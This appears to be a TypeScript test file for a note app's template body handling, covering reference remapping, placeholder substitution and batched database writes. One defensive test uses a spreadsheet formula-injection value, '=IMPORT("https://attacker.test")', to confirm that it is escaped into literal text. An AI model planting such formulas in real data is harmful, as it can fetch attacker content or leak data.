import { describe, expect, it } from 'vitest';
import type { Pool } from 'pg';
import type { ItemBody } from '@nix/export';
import { evaluateSheet } from '@nix/sheet';
import * as Y from 'yjs';

import { strategyFor } from '../documents/body-kinds.ts';
import { LIMITS } from '../documents/limits.ts';
import {
  copyBodies,
  documentFromArchiveBody,
  inventoryItemReferences,
  remapItemReferences,
  TemplateBodyError,
  substituteTemplateBodyText,
  transformTemplateBody,
  validateArchiveBodies,
  writeArchiveBodies,
} from './bodies.ts';

describe('template body reference remapping', () => {
  it('remaps portable inline Nix links and removes references Core marked as omitted', () => {
    const source = '11111111-1111-4111-8111-111111111111';
    const target = '22222222-2222-4222-8222-222222222222';
    const omitted = '33333333-3333-4333-8333-333333333333';
    const portable = {
      type: 'doc',
      content: [
        {
          type: 'text',
          text: 'Learn',
          marks: [{ type: 'link', attrs: { href: `nix://item/${source}` } }],
        },
        {
          type: 'text',
          text: 'Legacy',
          marks: [{ type: 'link', attrs: { href: `nix://item/${omitted}` } }],
        },
      ],
    };

    expect(
      remapItemReferences(portable, new Map([[source, target]]), true, new Map([[omitted, null]])),
    ).toEqual({
      type: 'doc',
      content: [
        {
          type: 'text',
          text: 'Learn',
          marks: [{ type: 'link', attrs: { href: `nix://item/${target}` } }],
        },
        { type: 'text', text: 'Legacy', marks: [] },
      ],
    });
    expect(inventoryItemReferences(portable)).toEqual([source, omitted]);
  });

  it('rewrites declared item references and leaves unrelated UUID values alone', () => {
    const source = '11111111-1111-4111-8111-111111111111';
    const target = '22222222-2222-4222-8222-222222222222';
    const remapped = remapItemReferences(
      {
        type: 'doc',
        content: [
          { type: 'reference', attrs: { kind: 'item', targetId: source, title: 'Source' } },
          { type: 'paragraph', attrs: { arbitraryId: source } },
        ],
      },
      new Map([[source, target]]),
    );

    expect(remapped).toMatchObject({
      content: [{ attrs: { targetId: target } }, { attrs: { arbitraryId: source } }],
    });
  });

  it('turns an external item link into an unresolved stub while preserving its cached label', () => {
    expect(
      remapItemReferences(
        {
          type: 'reference',
          attrs: {
            kind: 'item',
            targetId: '11111111-1111-4111-8111-111111111111',
            label: 'Outside note',
          },
        },
        new Map(),
        true,
      ),
    ).toMatchObject({ attrs: { targetId: null, label: 'Outside note' } });
  });

  it('rewrites canonical Excalidraw markers and transitional native canvas references', () => {
    const sourceItem = '11111111-1111-4111-8111-111111111111';
    const targetItem = '22222222-2222-4222-8222-222222222222';
    const sourceFile = '33333333-3333-4333-8333-333333333333';
    const targetFile = '44444444-4444-4444-8444-444444444444';

    const remapped = remapItemReferences(
      {
        elements: {
          item: {
            type: 'rectangle',
            link: `nix://item/${sourceItem}`,
            customData: { nix: { kind: 'item', itemId: sourceItem, label: 'Brief' } },
          },
          file: {
            type: 'image',
            fileId: sourceFile,
            status: 'saved',
            customData: { nix: { kind: 'file', itemId: sourceFile, label: 'Diagram' } },
          },
          transitionalCard: {
            type: 'card',
            itemId: sourceItem,
            link: `nix://item/${sourceItem}`,
          },
          transitionalImage: { type: 'image', imageItemId: sourceFile },
          mixedCard: {
            type: 'card',
            itemId: sourceFile,
            link: `nix://item/${sourceFile}`,
            customData: { nix: { kind: 'item', itemId: sourceItem } },
          },
          mixedImage: {
            type: 'image',
            fileId: sourceItem,
            imageItemId: sourceItem,
            customData: { nix: { kind: 'file', itemId: sourceFile } },
          },
          opaqueExcalidrawFile: { type: 'image', fileId: sourceFile },
          arbitrary: { arbitraryId: sourceItem },
        },
      },
      new Map([
        [sourceItem, targetItem],
        [sourceFile, targetFile],
      ]),
    );

    expect(remapped).toMatchObject({
      elements: {
        item: {
          link: `nix://item/${targetItem}`,
          customData: { nix: { itemId: targetItem, label: 'Brief' } },
        },
        file: {
          fileId: targetFile,
          status: 'saved',
          customData: { nix: { itemId: targetFile, label: 'Diagram' } },
        },
        transitionalCard: { itemId: targetItem, link: `nix://item/${targetItem}` },
        transitionalImage: { imageItemId: targetFile },
        // A canonical marker also wins over stale native fields while a scene is migrating.
        mixedCard: {
          itemId: targetItem,
          link: `nix://item/${targetItem}`,
          customData: { nix: { itemId: targetItem } },
        },
        mixedImage: {
          fileId: targetFile,
          imageItemId: targetFile,
          customData: { nix: { itemId: targetFile } },
        },
        // An unmarked Excalidraw file id is opaque, even when it happens to match a Nix UUID.
        opaqueExcalidrawFile: { fileId: sourceFile },
        arbitrary: { arbitraryId: sourceItem },
      },
    });
  });

  it('stubs canvas references outside the copied tree without leaving a source file id', () => {
    const outsideItem = '11111111-1111-4111-8111-111111111111';
    const outsideFile = '33333333-3333-4333-8333-333333333333';

    expect(
      remapItemReferences(
        {
          elements: {
            item: {
              type: 'rectangle',
              link: `nix://item/${outsideItem}`,
              customData: { nix: { kind: 'item', itemId: outsideItem, label: 'Outside note' } },
            },
            file: {
              type: 'image',
              fileId: outsideFile,
              status: 'saved',
              customData: { nix: { kind: 'file', itemId: outsideFile, label: 'Outside image' } },
            },
            transitionalCard: {
              type: 'card',
              itemId: outsideItem,
              link: `nix://item/${outsideItem}`,
            },
            transitionalImage: { type: 'image', imageItemId: outsideFile },
          },
        },
        new Map(),
        true,
      ),
    ).toEqual({
      elements: {
        item: {
          type: 'rectangle',
          link: null,
          customData: { nix: { kind: 'item', itemId: null, label: 'Outside note' } },
        },
        file: {
          type: 'image',
          fileId: null,
          status: 'error',
          customData: { nix: { kind: 'file', itemId: null, label: 'Outside image' } },
        },
        transitionalCard: { type: 'card', itemId: '', link: null },
        transitionalImage: { type: 'image' },
      },
    });
  });

  it('applies Core reference mappings and explicit omissions only to declared item links', () => {
    const external = '11111111-1111-4111-8111-111111111111';
    const replacement = '22222222-2222-4222-8222-222222222222';
    const remapped = transformTemplateBody(
      'note',
      {
        type: 'doc',
        content: [
          { type: 'reference', attrs: { kind: 'item', targetId: external, label: 'Outside' } },
          { type: 'paragraph', attrs: { arbitraryId: external } },
        ],
      },
      new Map(),
      { referenceMappings: new Map([[external, replacement]]) },
    );
    expect(remapped).toMatchObject({
      content: [
        { attrs: { targetId: replacement, label: 'Outside' } },
        { attrs: { arbitraryId: external } },
      ],
    });

    expect(
      transformTemplateBody(
        'note',
        { type: 'reference', attrs: { kind: 'item', targetId: external, label: 'Outside' } },
        new Map(),
        { referenceMappings: new Map([[external, null]]) },
      ),
    ).toEqual({ type: 'reference', attrs: { kind: 'item', targetId: null, label: 'Outside' } });
  });

  it('inventories item targets before unknown references are stubbed during capture', () => {
    const external = '11111111-1111-4111-8111-111111111111';
    const body = {
      type: 'doc',
      content: [
        { type: 'itemBlock', attrs: { targetId: external } },
        { type: 'reference', attrs: { kind: 'principal', targetId: 'not-an-item' } },
      ],
    };

    expect(inventoryItemReferences(body)).toEqual([external]);
    expect(inventoryItemReferences(remapItemReferences(body, new Map(), true))).toEqual([]);
  });
});

describe('template body text binding', () => {
  it('preserves unresolved placeholders until Core supplies application bindings', () => {
    const body = {
      type: 'doc',
      content: [{ type: 'paragraph', content: [{ type: 'text', text: 'Hello {{name}}' }] }],
    };
    expect(transformTemplateBody('note', body, new Map(), { stubUnknown: false })).toEqual(body);
    expect(() => transformTemplateBody('note', body, new Map(), { textBindings: {} })).toThrow(
      /Core did not resolve/,
    );
  });

  it('substitutes prose leaves while preserving links, code, URLs and arbitrary attributes', () => {
    const bindings = { name: 'Quarterly plan' };
    const result = substituteTemplateBodyText(
      'note',
      {
        type: 'doc',
        content: [
          { type: 'paragraph', content: [{ type: 'text', text: 'Welcome {{name}}.' }] },
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'https://example.test/{{name}}',
                marks: [{ type: 'link', attrs: { href: 'https://example.test/{{name}}' } }],
              },
            ],
          },
          { type: 'codeBlock', content: [{ type: 'text', text: 'const x = "{{name}}";' }] },
          { type: 'reference', attrs: { targetId: '{{name}}', label: '{{name}}' } },
        ],
      },
      bindings,
    );

    expect(result).toEqual({
      type: 'doc',
      content: [
        { type: 'paragraph', content: [{ type: 'text', text: 'Welcome Quarterly plan.' }] },
        {
          type: 'paragraph',
          content: [
            {
              type: 'text',
              text: 'https://example.test/{{name}}',
              marks: [{ type: 'link', attrs: { href: 'https://example.test/{{name}}' } }],
            },
          ],
        },
        { type: 'codeBlock', content: [{ type: 'text', text: 'const x = "{{name}}";' }] },
        { type: 'reference', attrs: { targetId: '{{name}}', label: '{{name}}' } },
      ],
    });
  });

  it('substitutes only canvas text fields and literal sheet cells, never formulas', () => {
    expect(
      substituteTemplateBodyText(
        'canvas',
        {
          elements: {
            text: {
              type: 'text',
              text: 'Plan for {{name}}',
              originalText: '{{name}}',
              link: 'https://x/{{name}}',
            },
            shape: { type: 'rectangle', text: '{{name}}', customData: { name: '{{name}}' } },
          },
        },
        { name: 'Q4' },
      ),
    ).toEqual({
      elements: {
        text: { type: 'text', text: 'Plan for Q4', originalText: 'Q4', link: 'https://x/{{name}}' },
        shape: { type: 'rectangle', text: '{{name}}', customData: { name: '{{name}}' } },
      },
    });

    const substitutedSheet = substituteTemplateBodyText(
      'spreadsheet',
      {
        cells: { A1: '{{name}}', B1: '=1+1' },
        meta: { rows: 1, cols: 2 },
      },
      { name: '=IMPORT("https://attacker.test")' },
    );
    expect(substitutedSheet).toEqual({
      cells: { A1: '\'=IMPORT("https://attacker.test")', B1: '=1+1' },
      meta: { rows: 1, cols: 2 },
    });
    const cells = (substitutedSheet as { cells: Record<string, string> }).cells;
    const evaluated = evaluateSheet({ cells: new Map(Object.entries(cells)) });
    expect(evaluated.values.get('A1')).toBe('=IMPORT("https://attacker.test")');
    expect(evaluated.values.get('B1')).toBe(2);
  });

  it('rejects unresolved placeholders in supported text and bounds total expansion', () => {
    for (const text of [
      'Hello {{missing}}',
      'Hello {{UPPER}}',
      'Hello {{bad key}}',
      'Hello {{name',
    ]) {
      expect(() =>
        substituteTemplateBodyText(
          'note',
          { type: 'paragraph', content: [{ type: 'text', text }] },
          {},
        ),
      ).toThrow(TemplateBodyError);
    }
    expect(() =>
      substituteTemplateBodyText(
        'note',
        { type: 'paragraph', content: [{ type: 'text', text: '{{constructor}}' }] },
        {},
      ),
    ).toThrow(/Core did not resolve/);
    expect(() =>
      substituteTemplateBodyText(
        'note',
        {
          type: 'paragraph',
          content: [
            { type: 'text', text: '{{na', marks: [{ type: 'bold' }] },
            { type: 'text', text: 'me}}', marks: [{ type: 'italic' }] },
          ],
        },
        { name: 'A project' },
      ),
    ).toThrow(/unclosed input marker/);

    const largeText = 'x'.repeat(200_000);
    expect(
      substituteTemplateBodyText(
        'note',
        { type: 'paragraph', content: [{ type: 'text', text: largeText }] },
        {},
      ),
    ).toEqual({ type: 'paragraph', content: [{ type: 'text', text: largeText }] });
    expect(() =>
      substituteTemplateBodyText(
        'note',
        { type: 'paragraph', content: [{ type: 'text', text: '{{name}}'.repeat(1_000) }] },
        { name: 'x'.repeat(200) },
      ),
    ).toThrow(/exceed the supported body expansion size/);
  });
});

describe('template body materialization', () => {
  it('preserves unresolved placeholders while capture and draft copies are materialized', async () => {
    const sourceId = '71000000-0000-4000-8000-000000000001';
    const targetId = '71000000-0000-4000-8000-000000000002';
    const body: ItemBody = {
      schemaVersion: 2,
      prosemirror: {
        type: 'doc',
        content: [
          { type: 'paragraph', content: [{ type: 'text', text: 'Hello {{project_name}}' }] },
        ],
      },
    };
    const copied = await copyBodies(
      sourceBodyPool(sourceId, body),
      writableAuthorization(),
      [{ sourceItemId: sourceId, targetItemId: targetId, itemType: 'note' }],
      new Map(),
      { stubUnknown: false },
    );

    expect(copied).toEqual([targetId]);
  });

  it('hydrates an imported archive body without consuming its template markers', async () => {
    const targetId = '72000000-0000-4000-8000-000000000002';
    const body: ItemBody = {
      schemaVersion: 2,
      prosemirror: {
        type: 'doc',
        content: [
          { type: 'paragraph', content: [{ type: 'text', text: 'Hello {{project_name}}' }] },
        ],
      },
    };
    const pool = emptyWritePool();
    const written = await writeArchiveBodies(
      pool,
      writableAuthorization(),
      [
        {
          sourceId: '72000000-0000-4000-8000-000000000001',
          targetItemId: targetId,
          itemType: 'note',
          body,
        },
      ],
      new Map(),
    );
    expect(written).toEqual([targetId]);
  });

  it('round-trips resized sheet columns with the cell grid', () => {
    const body = {
      schemaVersion: 1,
      sheet: {
        body: 'sheet' as const,
        cells: { A1: 'value' },
        meta: { rows: 100, cols: 26, colWidths: { A: 240, B: 300 } },
      },
    };

    const restored = documentFromArchiveBody('spreadsheet', body);

    expect(strategyFor('spreadsheet').materialize(restored).json).toEqual(body.sheet);
  });

  it('refuses at preview when a valid body cannot fit the durable initialization update', () => {
    const body = {
      schemaVersion: 2,
      prosemirror: {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [{ type: 'text', text: 'x'.repeat(LIMITS.updateBytes + 1024) }],
          },
        ],
      },
    };

    expect(() => {
      validateArchiveBodies([{ id: 'source', type: 'note', body }]);
    }).toThrow(/collaboration update ceiling/);
  });

  it('initializes two hundred bodies with a bounded number of database commands', async () => {
    const commands: string[] = [];
    const client = {
      query: (text: string, values?: readonly unknown[]) => {
        commands.push(text);
        const rows = text.includes('RETURNING item_id')
          ? ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }))
          : [];
        return Promise.resolve({ rows, rowCount: rows.length });
      },
      release: () => undefined,
    };
    const pool = { connect: () => Promise.resolve(client) } as unknown as Pool;
    const writes = Array.from({ length: 200 }, (_unused, index) => ({
      sourceId: `source-${String(index)}`,
      targetItemId: `10000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
      itemType: 'note',
      body: {
        schemaVersion: 2,
        prosemirror: { type: 'doc', content: [{ type: 'paragraph' }] },
      } as const,
    }));

    const written = await writeArchiveBodies(
      pool,
      {
        tenantId: '20000000-0000-4000-8000-000000000001',
        principalId: '20000000-0000-4000-8000-000000000002',
        workspaceId: '20000000-0000-4000-8000-000000000003',
        itemType: 'note',
        canWrite: true,
      },
      writes,
      new Map(),
    );

    expect(written).toHaveLength(200);
    expect(commands.length).toBeLessThan(20);
    expect(
      commands.filter((command) => command.includes('INSERT INTO content_update')),
    ).toHaveLength(1);
  });

  it('loads and clones two hundred source bodies without a serial command storm', async () => {
    const commands: string[] = [];
    const sourceState = documentFromArchiveBody('note', {
      schemaVersion: 2,
      prosemirror: { type: 'doc', content: [{ type: 'paragraph' }] },
    });
    const sourceUpdate = Buffer.from(Y.encodeStateAsUpdate(sourceState));
    sourceState.destroy();
    const copies = Array.from({ length: 200 }, (_unused, index) => ({
      sourceItemId: `30000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
      targetItemId: `40000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
      itemType: 'note',
    }));
    const client = {
      query: (text: string, values?: readonly unknown[]) => {
        commands.push(text);
        let rows: Record<string, unknown>[] = [];
        if (text.includes('snapshot.seq AS snapshot_seq')) {
          rows = copies.map((copy, index) => ({
            doc_id: `50000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
            item_id: copy.sourceItemId,
            workspace_id: '20000000-0000-4000-8000-000000000003',
            schema_version: 2,
            head_seq: '0',
            snapshot_seq: '0',
            yjs_state: sourceUpdate,
          }));
        } else if (text.includes('RETURNING item_id')) {
          rows = ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }));
        }
        return Promise.resolve({ rows, rowCount: rows.length });
      },
      release: () => undefined,
    };
    const pool = { connect: () => Promise.resolve(client) } as unknown as Pool;

    const written = await copyBodies(
      pool,
      {
        tenantId: '20000000-0000-4000-8000-000000000001',
        principalId: '20000000-0000-4000-8000-000000000002',
        workspaceId: '20000000-0000-4000-8000-000000000003',
        itemType: 'note',
        canWrite: true,
      },
      copies,
      new Map(copies.map((copy) => [copy.sourceItemId, copy.targetItemId])),
    );

    expect(written).toHaveLength(200);
    expect(commands.length).toBeLessThan(20);
    expect(
      commands.filter((command) => command.includes('FROM content_update stored')),
    ).toHaveLength(1);
    expect(
      commands.filter((command) => command.includes('INSERT INTO content_update')),
    ).toHaveLength(1);
  });

  it('uses the staged body reference inventory when capture retries after the source changes', async () => {
    const externalInStagedBody = '60000000-0000-4000-8000-000000000001';
    const externalInEditedSource = '60000000-0000-4000-8000-000000000002';
    const sourceItemId = '70000000-0000-4000-8000-000000000001';
    const targetItemId = '70000000-0000-4000-8000-000000000002';
    const internalSourceId = '70000000-0000-4000-8000-000000000003';
    const internalTargetId = '70000000-0000-4000-8000-000000000004';
    const sourceDocument = documentFromArchiveBody(
      'note',
      noteWithReference(externalInEditedSource),
    );
    const stagedDocument = documentFromArchiveBody(
      'note',
      noteWithReferences([externalInStagedBody, internalTargetId]),
    );
    const sourceUpdate = Buffer.from(Y.encodeStateAsUpdate(sourceDocument));
    const stagedUpdate = Buffer.from(Y.encodeStateAsUpdate(stagedDocument));
    sourceDocument.destroy();
    stagedDocument.destroy();
    const client = {
      query: (text: string) => {
        if (text.includes('snapshot.seq AS snapshot_seq')) {
          return Promise.resolve({
            rows: [
              {
                doc_id: '80000000-0000-4000-8000-000000000001',
                item_id: sourceItemId,
                workspace_id: '20000000-0000-4000-8000-000000000003',
                schema_version: 2,
                head_seq: '1',
                snapshot_seq: '1',
                yjs_state: sourceUpdate,
              },
              {
                doc_id: '80000000-0000-4000-8000-000000000002',
                item_id: targetItemId,
                workspace_id: '20000000-0000-4000-8000-000000000003',
                schema_version: 2,
                head_seq: '1',
                snapshot_seq: '1',
                yjs_state: stagedUpdate,
              },
            ],
            rowCount: 2,
          });
        }
        return Promise.resolve({ rows: [], rowCount: 0 });
      },
      release: () => undefined,
    };
    const pool = { connect: () => Promise.resolve(client) } as unknown as Pool;
    const inventories: string[][] = [];

    await copyBodies(
      pool,
      {
        tenantId: '20000000-0000-4000-8000-000000000001',
        principalId: '20000000-0000-4000-8000-000000000002',
        workspaceId: '20000000-0000-4000-8000-000000000003',
        itemType: 'note',
        canWrite: true,
      },
      [{ sourceItemId, targetItemId, itemType: 'note' }],
      new Map([[internalSourceId, internalTargetId]]),
      {
        stubUnknown: false,
        onReferenceInventory: ({ externalTargetIds }) => {
          inventories.push([...externalTargetIds]);
        },
      },
    );

    expect(inventories).toEqual([[externalInStagedBody]]);
  });
});

function noteWithReference(targetId: string): ItemBody {
  return noteWithReferences([targetId]);
}

function noteWithReferences(targetIds: readonly string[]): ItemBody {
  return {
    schemaVersion: 2,
    prosemirror: {
      type: 'doc',
      content: [
        {
          type: 'paragraph',
          content: [
            ...targetIds.map((targetId) => ({
              type: 'reference',
              attrs: { kind: 'item', targetId, label: 'Cached title' },
            })),
          ],
        },
      ],
    },
  };
}

function writableAuthorization() {
  return {
    tenantId: '20000000-0000-4000-8000-000000000001',
    principalId: '20000000-0000-4000-8000-000000000002',
    workspaceId: '20000000-0000-4000-8000-000000000003',
    itemType: 'note',
    canWrite: true,
  } as const;
}

function emptyWritePool(): Pool {
  const client = {
    query: (text: string, values?: readonly unknown[]) => {
      const rows = text.includes('RETURNING item_id')
        ? ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }))
        : [];
      return Promise.resolve({ rows, rowCount: rows.length });
    },
    release: () => undefined,
  };
  return { connect: () => Promise.resolve(client) } as unknown as Pool;
}

function sourceBodyPool(sourceId: string, body: ItemBody): Pool {
  const source = documentFromArchiveBody('note', body);
  const yjsState = Buffer.from(Y.encodeStateAsUpdate(source));
  source.destroy();
  const client = {
    query: (text: string, values?: readonly unknown[]) => {
      if (text.includes('snapshot.seq AS snapshot_seq')) {
        return Promise.resolve({
          rows: [
            {
              doc_id: '73000000-0000-4000-8000-000000000001',
              item_id: sourceId,
              workspace_id: '20000000-0000-4000-8000-000000000003',
              schema_version: 2,
              head_seq: '1',
              snapshot_seq: '1',
              yjs_state: yjsState,
            },
          ],
          rowCount: 1,
        });
      }
      const rows = text.includes('RETURNING item_id')
        ? ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }))
        : [];
      return Promise.resolve({ rows, rowCount: rows.length });
    },
    release: () => undefined,
  };
  return { connect: () => Promise.resolve(client) } as unknown as Pool;
}

it('remaps embedded notes and subpages during native archive import', () => {
  const source = '11111111-1111-4111-8111-111111111111';
  const target = '22222222-2222-4222-8222-222222222222';
  expect(
    remapItemReferences(
      { type: 'itemBlock', attrs: { targetId: source, presentation: 'embed' } },
      new Map([[source, target]]),
    ),
  ).toEqual({ type: 'itemBlock', attrs: { targetId: target, presentation: 'embed' } });
});
